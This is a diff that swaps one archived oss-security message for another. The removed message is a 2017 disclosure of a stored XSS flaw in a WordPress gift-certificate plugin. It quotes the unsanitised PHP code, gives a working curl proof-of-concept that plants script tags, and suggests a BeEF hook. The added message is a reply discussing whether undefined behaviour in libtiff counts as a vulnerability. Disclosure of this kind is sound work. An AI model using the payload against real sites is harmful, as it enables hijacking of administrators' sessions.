@@ -1,63 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/06/02/6
-Message-id: <1FF6A1D9-4F53-40F3-A9E5-0E7AA03F82A6@me.com>
-Date: Fri, 02 Jun 2017 13:45:49 -0400
-From: "Larry W. Cashdollar" <larry0@...com>
-To: Open Source Security <oss-security@...ts.openwall.com>
-Subject: Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/12/3
+Message-ID: <20170412150045.2ce45082@pc1>
+Date: Wed, 12 Apr 2017 15:00:45 +0200
+From: Hanno Böck <hanno@...eck.de>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2017-7592: libtiff: left shift
 Content-Type: text/plain; charset=utf-8
 
-Title: Unauthenticated Stored XSS Vulnerability in Wordpress plugin gift-certificate-creator v1.0
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-05-15
-CVE-ID:[CVE-2017-1002017]
-Download Site: https://wordpress.org/plugins/gift-certificate-creator/
-Vendor: Bob Cares https://bobcares.com/
-Vendor Notified: 2017-05-17
-Vendor Contact: plugins@...dpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=191
-Description: Gift Certificate Creator WordPress plugin allows you to manage gift certificates on your website. In a convenient front-end UI provided by this plugin, your site visitors can enter the amount and user details. On form submission, the user details will be sent to the administrator. Also, the administrator can view the list of all the certificate requests.
-Vulnerability:
-Publically accessible pages that are using the shortcode ‘[gift_certificate_form]’ allow any user to add gift certificate entries into the database.  These entries are listed by the Wordpress administrator when visiting the plugin admin page.  This action is performed by gc-list.php which doesn't sanitize the entries before
-displaying them.   This allows malicious javascript to be injected into the WordPress database. 
+On Mon, 10 Apr 2017 08:29:31 +0100
+Simon McVittie <smcv@...ian.org> wrote:
 
+> This is a bug, but how is it a security vulnerability? Can an attacker
+> exploit it for DoS or code execution or something with a malformed
+> TIFF image?
 
-In file giftcertificates.php 
-141:    if ($_REQUEST['action'] == 'Submit') {
-144:        //if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_number']) && !empty($_REQUEST['cc_sec_code'])) {
-145:   		if (!empty($_REQUEST['cert_amount']) && !empty($_REQUEST['cc_sec_code'])) {
-147:            $gcmObj->createNewGCM($_REQUEST);
-149:            writeLog(" amount ".$_REQUEST['cert_amount']." and email ".$_REQUEST['cc_sec_code']." are posted successfully", basename(__LINE__), basename(__FILE__));
-152:            $gcmObj->sendGCMReportEmail(GC_MAIL_TO, GC_MAIL_FROM, GC_MAIL_SUBJECT, $_REQUEST);
-153:            $_REQUEST = array();
-212-    <form method="get" name="gc_form" action="">
-213-        <table class='gc_form'>
-214-            <tr>
-215-                <th>Certificate Amount:</th>
-216:                <td><input type="text" name="cert_amount" value="<?php echo $_REQUEST['cert_amount']; ?>" placeholder ="$"></td>
-217-            </tr>
-218-            <tr>
-219-                <th>Your Name:</th>
-220:                <td><input type="text" name="user_name" value="<?php echo $_REQUEST['user_name']; ?>"> (optional)</td>
-221-            </tr>
-222-            <tr>
-223-                <th>Recipient Name:</th>
-224:                <td><input type="text" name="receip_name" value="<?php echo $_REQUEST['receip_name']; ?>"> (optional)</td>
-225-            </tr>
-226-            <tr>
-227-                <th>Recipient Email:</th>
-228:                <td><input type="text" name="cc_sec_code" value="<?php echo $_REQUEST['cc_sec_code']; ?>"></td>
-229-            </tr>
-230-            <tr>
-231-                <th>Recipient Address:</th>
-232:                <td><textarea name="receip_address" value="<?php echo $_REQUEST['receip_address']; ?>"></textarea>
-233-            </tr>
-234-            <tr>
-235-                <td colspan="2" style="text-align: center;"><input type="submit" value="Submit" name="action"></td>
-236-            </tr>
-237-        </table>
+Quesitons like this come up quite often. Maybe we need a final definite
+answer to them all :-)
 
-Exploit Code:
-	• $ curl http://example/index.php/2017/05/16/gift-certificates/?cert_amount=50&user_name=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&receip_name=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&cc_sec_code=no%40me.net&receip_address=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&action=Submit
+The reasoning is roughly: It's undefined behavior, so the compiler can
+do whatever it wants. So all undefined behavior should be considered
+security relevant, because the compiler can always do something that
+will turn it into a vuln.
+Whether you agree to this or not, it's definitely good secure coding
+practice to avoid undefined behavior. People have different ideas of
+what to call a vuln and what not. CVE-assigners have lately taken a
+very wide approach of declaring many things as cve-worthy. Just accept
+that not every CVE means "it's definitely exploitable".
 
-Notes: Inject a BeEF hook even.
+-- 
+Hanno Böck
+https://hboeck.de/
+
+mail/jabber: hanno@...eck.de
+GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
